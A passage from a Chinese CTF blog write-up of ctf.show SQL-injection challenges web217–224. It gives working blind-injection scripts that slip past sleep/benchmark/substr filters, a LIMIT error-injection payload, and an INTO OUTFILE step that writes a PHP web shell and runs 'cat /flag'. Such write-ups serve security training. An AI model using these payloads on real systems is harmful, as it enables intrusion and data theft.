class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://8184624f-3ac4-4ac2-b195-865a82d8cb94.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(1),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaac from ctfshow_flagxcc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,sleep(1),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web217"><a class="markdownIt-Anchor" href="#web217"></a> web217</h2><p>本题过滤了sleep,网上可以简答的搜索一下内容</p><p>使用 <code>BENCHMARK</code> 函数，结合一个较大的数值来引入延迟。这是MySQL中的内置函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://078b3b8c-d67e-4948-b1f2-239e5176f712.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaabc from ctfshow_flagxccb),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,BENCHMARK(1000000, MD5(&#x27;orange&#x27;)),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web218"><a class="markdownIt-Anchor" href="#web218"></a> web218</h2><p>这题benchmark也被禁用了，尝试一些其他方法</p><p>我使用的是笛卡尔积造成的短暂延迟，结合两个表的计数可以引入一定的延迟。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://380bc0f7-937d-4516-a20e-aaa284e086a2.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaac from ctfshow_flagxc),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.3</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web219"><a class="markdownIt-Anchor" href="#web219"></a> web219</h2><p>禁用了rlike，我没使用到，继续用上题的脚本,需要微调一下时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://eca68551-e138-419b-a9f7-8bff2348458d.challenge.ctf.show//api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;1&#x27;,&quot;ip&quot;:f&quot;0) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;index&#125;,1)=&#x27;&#123;char&#125;&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(substr((select flagaabc from ctfshow_flagxca),<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.2</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web220"><a class="markdownIt-Anchor" href="#web220"></a> web220</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><p>禁用的东西挺多的</p><p>concat既然禁用了可以使用limit进行绕过，微调一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>dicts = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-_&#123;&#125;,&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://581c4aa9-8e30-4f3e-9253-216e7c43703a.challenge.ctf.show/api/index.php&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;0&#x27;, &quot;ip&quot;: f&quot;0) or if(left((select table_name from information_schema.tables where table_schema=database() limit 0, 1),&#123;index&#125;)regexp(&#x27;&#123;flag+char&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        <span class="hljs-comment">#payload = &#123;&#x27;debug&#x27;:&#x27;0&#x27;, &quot;ip&quot;: f&quot;0) or if(left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1, 1),&#123;index&#125;)regexp(&#x27;&#123;flag+char&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 0)#&quot;&#125;</span><br>        payload = &#123;<span class="hljs-string">&#x27;debug&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-string">f&quot;0) or if(left((select flagaabcc from ctfshow_flagxcac),<span class="hljs-subst">&#123;index&#125;</span>)regexp(&#x27;<span class="hljs-subst">&#123;flag+char&#125;</span>&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),0)#&quot;</span>&#125;<br><br>        <span class="hljs-comment"># 构造完整请求 URL</span><br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.post(url=url, data=payload).text<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> end_time - start_time &gt;=<span class="hljs-number">0.2</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终 情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>到这边盲注就结束了，略感疲惫。</p><h2 id="web221"><a class="markdownIt-Anchor" href="#web221"></a> web221</h2><p>limit注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-title function_ invoke__">limit</span> (<span class="hljs-variable">$page</span>-<span class="hljs-number">1</span>)*<span class="hljs-variable">$limit</span>,<span class="hljs-variable">$limit</span>;<br></code></pre></td></tr></table></figure><p>放个p神的文章，可以了解一下具体内容<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法)</a>，在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，这里利用procedure和analyse两个函数一齐食用，同时利用报错注入</p><p>在/api下进行get发包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?page=1&amp;<span class="hljs-built_in">limit</span>=1 procedure analyse(extractvalue(1,concat(0x7e,database())),1)<br></code></pre></td></tr></table></figure><p>得到的数据库名就是flag直接交就行</p><h2 id="web222"><a class="markdownIt-Anchor" href="#web222"></a> web222</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = select * <span class="hljs-keyword">from</span> ctfshow_user group by <span class="hljs-variable">$username</span>;<br></code></pre></td></tr></table></figure><p>研究一下y4师傅的脚本，也是用二分法写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://fd01f201-a270-4d94-99b1-e530d1e1cdfb.challenge.ctf.show/api/&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 二分法进行查找</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        <span class="hljs-comment">#payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;limit 1,1&quot;</span><br>        payload = <span class="hljs-string">&quot;select flagaabc from ctfshow_flaga&quot;</span><br>        params = &#123;<br>            <span class="hljs-string">&#x27;u&#x27;</span>: <span class="hljs-string">f&quot;concat((if (ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>, sleep(0.05), 2)), 1);&quot;</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span>:<br>            r = requests.get(url, params=params, timeout=<span class="hljs-number">1</span>)<br>            tail = mid<br>        <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>            head = mid + <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>利用不断的比较大小，拼接得到flag，可能会有细小误差，手动调节就行</p><h2 id="web223"><a class="markdownIt-Anchor" href="#web223"></a> web223</h2><p>无数字可以参照web185进行绕过，都是利用true进行绕过，浅浅的研究了下脚本，直接贴吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generateNum</span>(<span class="hljs-params">num</span>):<br>    res = <span class="hljs-string">&#x27;true&#x27;</span><br>    <span class="hljs-keyword">if</span> num == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num - <span class="hljs-number">1</span>):<br>            res += <span class="hljs-string">&quot;+true&quot;</span><br>        <span class="hljs-keyword">return</span> res<br><br>url = <span class="hljs-string">&quot;http://f1d0f6ad-cd9f-432a-885f-42f4c6f20289.challenge.ctf.show/api/&quot;</span><br>i = <span class="hljs-number">0</span><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    i = i + <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 查数据库-ctfshow_flagas</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        <span class="hljs-comment"># 查字段-flagasabc</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;&quot;</span><br>        <span class="hljs-comment"># 查flag</span><br>        payload = <span class="hljs-string">&quot;select flagasabc from ctfshow_flagas&quot;</span><br>        params = &#123;<br>            <span class="hljs-string">&quot;u&quot;</span>: <span class="hljs-string">f&quot;if(ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;generateNum(i)&#125;</span>,<span class="hljs-subst">&#123;generateNum(<span class="hljs-number">1</span>)&#125;</span>))&gt;<span class="hljs-subst">&#123;generateNum(mid)&#125;</span>,username,&#x27;a&#x27;)&quot;</span><br>        &#125;<br>        r = requests.get(url, params=params)<br>        <span class="hljs-comment"># print(r.json()[&#x27;data&#x27;])</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;userAUTO&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        res += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="web224"><a class="markdownIt-Anchor" href="#web224"></a> web224</h2><p>前端的登陆框架尝试sql注入绕不过去，看一下robot.txt，跟进发现php继续跟进可以重置admin的密码，重置后登陆，有文件上传，尝试了一些的文件都上传不成功，看看wp，讲的是文件类型注入，通过into写马得到flag,学一下。保存为a.bin</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">C64File &quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/orange.php&#x27;;--+<br></code></pre></td></tr></table></figure><p>C64File 是与 Commodore 64 相关的文件类型，之后闭合，写入 sql 语句这里写的是一句话的🐎</p><p>然后在orange.php里执行<code>?1=cat /flag</code>即可</p><h2 